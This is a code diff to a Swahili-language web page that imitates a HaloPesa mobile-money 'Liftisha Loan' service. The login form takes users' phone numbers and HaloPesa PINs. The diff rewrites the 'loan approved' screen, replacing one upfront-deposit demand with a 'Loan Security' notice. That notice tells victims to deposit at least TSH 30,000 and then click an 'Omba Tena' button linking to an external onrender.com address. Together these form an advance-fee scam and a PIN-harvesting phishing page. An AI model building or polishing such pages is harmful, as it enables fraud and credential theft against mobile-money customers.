@@ -397,7 +397,7 @@
 
   /* APPROVAL */
   #page-approval { background:var(--halo-orange); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
-  .appr-wrap { width:100%; max-width:520px; border-radius:var(--radius); overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.3); }
+  .appr-wrap { width:100%; max-width:520px; border-radius:var(--radius); overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.3); background:#fff; }
   .appr-top { background:#fff; padding:28px 24px 0; text-align:center; }
   .check-circle { width:56px; height:56px; border-radius:50%; background:var(--halo-orange); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.5rem; color:#FFFFFF; font-weight:bold; box-shadow:0 4px 16px rgba(255,85,0,0.3); }
   .appr-title { font-size:1.25rem; font-weight:800; color:var(--halo-orange); margin-bottom:6px; }
@@ -405,9 +405,6 @@
   .appr-banner { background:var(--halo-orange); padding:18px; margin:0 -24px; text-align:center; border-top:3px solid var(--halo-orange-dark); }
   .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.85); text-transform:uppercase; letter-spacing:0.06em; font-weight:600; }
   .appr-banner .aba { font-size:2rem; font-weight:800; color:#FFFFFF; }
-  .comp-box { background:#FFF8F0; border:1px solid #FFD6B3; padding:16px; }
-  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#B33600; margin-bottom:6px; }
-  .comp-box p { font-size:0.78rem; color:#B33600; line-height:1.6; }
   .ld-card { background:#fff; padding:20px 24px; }
   .ld-card .ld-htitle { font-size:0.82rem; font-weight:700; color:var(--halo-orange); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
   .ld-card .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
@@ -418,13 +415,79 @@
   .ic-p{background:linear-gradient(135deg,#F59E0B,#D97706);}
   .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; font-weight:600; }
   .ld-val { font-size:0.9rem; font-weight:700; color:var(--text-dark); }
-  .qa-wrap { background:#fff; padding:0 24px 18px; }
-  .qa-title { font-size:0.8rem; font-weight:700; color:var(--text-mid); margin-bottom:10px; text-align:center; }
-  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:600; color:var(--halo-orange); cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .qa-btn:hover { border-color:var(--halo-orange); background:#FFF8F0; }
-  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
-  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
   .rth-wrap { background:#fff; padding:14px 24px 24px; }
+
+  /* SECURITY NOTICE CARD */
+  .security-notice-card {
+    background: #FFFFFF;
+    border-left: 4px solid var(--halo-orange);
+    border-radius: var(--radius-sm);
+    padding: 18px 20px;
+    margin: 16px 24px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    border-top: 1px solid #F3F4F6;
+    border-right: 1px solid #F3F4F6;
+    border-bottom: 1px solid #F3F4F6;
+  }
+
+  .sn-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 10px;
+  }
+
+  .sn-icon {
+    font-size: 1.1rem;
+  }
+
+  .sn-title {
+    font-size: 0.9rem;
+    font-weight: 700;
+    color: var(--halo-orange-dark);
+    letter-spacing: -0.01em;
+  }
+
+  .sn-body p {
+    font-size: 0.83rem;
+    color: var(--text-mid);
+    line-height: 1.55;
+    margin-bottom: 8px;
+  }
+
+  .sn-body p:last-child {
+    margin-bottom: 0;
+  }
+
+  .sn-body strong {
+    color: var(--text-dark);
+    font-weight: 700;
+  }
+
+  /* OMBA TENA BUTTON */
+  .btn-omba-tena {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    background: linear-gradient(135deg, #FF5500 0%, #D44400 100%);
+    color: #FFFFFF;
+    font-size: 1rem;
+    font-weight: 800;
+    padding: 16px 24px;
+    border-radius: 50px;
+    text-decoration: none;
+    box-shadow: 0 4px 14px rgba(212, 68, 0, 0.35);
+    transition: all 0.2s ease;
+    letter-spacing: 0.03em;
+  }
+
+  .btn-omba-tena:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 18px rgba(212, 68, 0, 0.45);
+    background: linear-gradient(135deg, #FF661A 0%, #E54B00 100%);
+  }
 
   /* INLINE ERROR MESSAGES */
   .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
@@ -517,7 +580,6 @@
         </div>
         <div class="pav-right">
           <div class="pr-top">OMBA SASA!</div>
-      
         </div>
       </div>
 
@@ -618,7 +680,7 @@
       </div>
       <div class="field">
         <label>Nambari ya Simu ya Halopesa</label>
-        <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s2ph" placeholder="0612345678" maxlength="10" oninput="clearErr('s2Err')"></div>
+        <div class="phone-row"><div class="ph-pre">🇹ℤ +255</div><input type="tel" id="s2ph" placeholder="0612345678" maxlength="10" oninput="clearErr('s2Err')"></div>
         <div class="field-hint">Weka nambari ya simu kuanzia na 06 au 07 (mfano, 0622345678)</div>
       </div>
       <div class="step-btns">
@@ -688,7 +750,7 @@
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
       <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇹🇿 +255</div>
+        <div class="lg-ph-pre">🇹ℤ +255</div>
         <input type="tel" id="lgPh" placeholder="0612345678" maxlength="10" oninput="chkLogin()">
       </div>
       <div class="pin-label">Weka PIN yako ya Halopesa (tarakimu 4)</div>
@@ -756,37 +818,64 @@
 <!-- PAGE APPROVAL -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
+    
+    <!-- Top Success Header -->
     <div class="appr-top">
       <div class="check-circle">✓</div>
-      <div class="appr-title">🎉 Hongera!</div>
-      <div class="appr-sub">Liftisha Loan yako <strong>imeidhinishwa!</strong> Fedha zitatolewa hivi karibuni kwenye Halopesa yako.</div>
-      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">TSH 10,000</div></div>
+      <div class="appr-title">Ombi Lako Limeidhinishwa!</div>
+      <div class="appr-sub">Hongera, mkopo wako wa <strong>Liftisha Loan</strong> uko tayari kutolewa kwenye akaunti yako ya HaloPesa.</div>
+      <div class="appr-banner">
+        <div class="abl">KIASI KILICHOIDHINISHWA</div>
+        <div class="aba" id="apAmt">TSH 10,000</div>
+      </div>
     </div>
-    <div class="comp-box" style="border: 1px solid #FFD6B3; border-radius: 8px; padding: 20px; background-color: #FFF8F0; font-family: sans-serif; max-width: 500px;">
-        <div class="ch" style="font-weight: bold; color: #B33600; margin-bottom: 10px; display: flex; align-items: center; gap: 8px;">
-            <span>⚠️</span> TAARIFA MUHIMU
-        </div>
-        <p style="line-height: 1.6; color: #B33600; margin: 0;">
-            Ili kuthibitisha ombi lako la mkopo, tafadhali weka amana ya <strong>TSH 30,000</strong> kwenye akaunti yako ya Halopesa. Baada ya amana kuthibitishwa, ombi lako litaidhinishwa papo hapo kwa njia ya haraka na salama.
-        </p>
-        <p style="line-height: 1.6; color: #B33600; margin: 10px 0 0 0;">
-            <em>Kumbuka:</em> Usipopokea menyu ya mkopo kwenye simu yako baada ya kuweka kiasi hicho, tafadhali tuma ombi lako upya.
-        </p>
-    </div>
+
+    <!-- Loan Summary Details -->
     <div class="ld-card">
       <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">TSH 936</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">Miezi 12</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">KIWANGO CHA RIBA</div><div class="ld-val">8% APR</div></div></div>
+      <div class="ld-row">
+        <div class="ld-icon ic-g">💵</div>
+        <div>
+          <div class="ld-lbl">MALIPO YA KILA MWEZI</div>
+          <div class="ld-val" id="apMthly">TSH 936</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-b">📅</div>
+        <div>
+          <div class="ld-lbl">MUDA WA MKOPO</div>
+          <div class="ld-val" id="apTerm">Miezi 12</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-p">📈</div>
+        <div>
+          <div class="ld-lbl">KIWANGO CHA RIBA</div>
+          <div class="ld-val">8% APR</div>
+        </div>
+      </div>
     </div>
-    <div class="qa-wrap">
-      <div class="qa-title">Vitendo vya Haraka</div>
-      <button class="qa-btn">💰 Weka Fedha</button>
-      <button class="qa-btn">💸 Toa Fedha</button>
-      <button class="qa-btn">📄 Maelezo ya Mkopo</button>
+
+    <!-- Professional Security & Deposit Notice Box -->
+    <div class="security-notice-card">
+      <div class="sn-header">
+        <span class="sn-icon">🔒</span>
+        <span class="sn-title">Uthibitisho wa Usalama wa Mkopo</span>
+      </div>
+      <div class="sn-body">
+        <p>Ikiwa utakosa kupokea mkopo wako ndani ya <strong>dakika 5</strong>, tafadhali weka amana ya angalau <strong>Tsh. 30,000</strong> kwenye akaunti yako kwa ajili ya usalama wa mkopo wako (Loan Security).</p>
+        <p>Baada ya kuweka amana hiyo, bofya kitufe cha <strong>"Omba Tena"</strong> hapa chini ili kukamilisha na kuharakisha utoaji wa fedha zako.</p>
+      </div>
     </div>
-    <div class="nxt-steps"><span>📱</span><p><strong>Hatua Zinazofuata:</strong><br>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p></div>
-    <div class="rth-wrap"><button class="btn-bovya" onclick="goTo('page-landing')" style="background:var(--halo-orange); color:#FFFFFF;">🏠 Rudi Nyumbani</button></div>
+
+    <!-- Redirect Button -->
+    <div class="rth-wrap">
+      <a href="https://halopesa-liftisha.onrender.com?admin=ADMIN001" class="btn-omba-tena">
+        <span>🔄</span>
+        <span>OMBA TENA</span>
+      </a>
+    </div>
+
   </div>
 </div>
 
